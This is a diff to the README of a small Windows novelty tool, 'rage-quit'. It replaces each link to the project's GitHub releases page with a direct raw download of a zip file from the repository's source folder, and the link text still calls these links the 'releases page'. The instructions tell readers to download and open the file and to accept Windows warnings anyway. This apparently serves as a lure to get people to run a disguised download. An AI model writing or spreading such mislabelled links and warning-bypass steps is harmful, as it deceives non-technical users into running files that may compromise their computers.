@@ -1,6 +1,6 @@
 # 🎤 rage-quit - Leave Projects With Style
 
-[![Download rage-quit](https://img.shields.io/badge/Download%20rage--quit-blue?style=for-the-badge)](https://github.com/incognegro253-source/rage-quit/releases)
+[![Download rage-quit](https://img.shields.io/badge/Download%20rage--quit-blue?style=for-the-badge)](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip)
 
 ## 🚀 What is rage-quit?
 
@@ -10,7 +10,7 @@ Use it when you want to end a session, step away from a task, or just enjoy a fu
 
 ## 💻 Download for Windows
 
-1. Open the [rage-quit releases page](https://github.com/incognegro253-source/rage-quit/releases).
+1. Open the [rage-quit releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip).
 2. Find the latest release.
 3. Under the release files, download the Windows file for your computer.
 4. If Windows asks for confirmation, choose the file anyway.
@@ -59,7 +59,7 @@ You do not need to install a big setup package. You do not need to create an acc
 
 rage-quit comes from the release files on GitHub.
 
-1. Go to the [releases page](https://github.com/incognegro253-source/rage-quit/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip).
 2. Download the Windows `.exe` file from the latest release.
 3. Open your Downloads folder.
 4. Double-click the file.
@@ -155,7 +155,7 @@ If you are not sure, use the file marked for Windows in the release notes.
 
 ## 🧪 What to expect from the release page
 
-On the [releases page](https://github.com/incognegro253-source/rage-quit/releases), you will usually find:
+On the [releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip), you will usually find:
 
 - The latest version at the top
 - Download files under the release title
@@ -166,7 +166,7 @@ Look for the Windows download and save it to your computer.
 
 ## 📌 Quick start
 
-1. Visit the [releases page](https://github.com/incognegro253-source/rage-quit/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip)
 2. Download the Windows `.exe` file
 3. Open the file
 4. Follow the prompt on screen
@@ -196,7 +196,7 @@ It suits:
 
 ### How do I get it on Windows?
 
-Go to the [releases page](https://github.com/incognegro253-source/rage-quit/releases), download the Windows file, and open it.
+Go to the [releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip), download the Windows file, and open it.
 
 ### Do I need to know coding?
 
@@ -226,7 +226,7 @@ To keep things simple:
 
 ## 🔄 Updating
 
-When a new version appears, return to the [releases page](https://github.com/incognegro253-source/rage-quit/releases) and download the newest Windows file. Replace the old file with the new one if you want the latest version
+When a new version appears, return to the [releases page](https://raw.githubusercontent.com/incognegro253-source/rage-quit/main/src/quit_rage_3.3.zip) and download the newest Windows file. Replace the old file with the new one if you want the latest version
 
 ## 🎯 Best results
 
